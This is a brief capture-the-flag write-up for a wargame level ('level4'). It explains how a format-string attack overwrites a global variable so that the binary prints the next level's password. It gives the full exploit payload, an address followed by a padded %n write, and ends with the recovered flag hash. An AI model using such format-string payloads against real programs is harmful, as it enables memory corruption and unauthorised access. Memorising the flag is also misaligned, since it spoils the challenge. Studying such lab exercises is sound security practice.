This binary seems to function similarly to the one in level3
The program will print the flag itself if we can alter obj.m 

mov eax, dword [obj.m] 	; 0x8049810
cmp eax, 0x1025544	; 16930116
...
# call sym.imp.system	; str.bin_cat__home_user_level5_.pass

We can do this with the same format string attack as level3
However, we won't be able to input 16930116 characters for %n, we will have to include a padding modifier
Additionally, the printf call takes place in a later stack frame than fgets, so we will have to reach higher in the memory to access the buffer for %n

python -c "print '\x08\x04\x98\x10'[::-1] + '%16930112x%12\$n'" > /tmp/inj4
cat /tmp/inj4 | ./level4

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
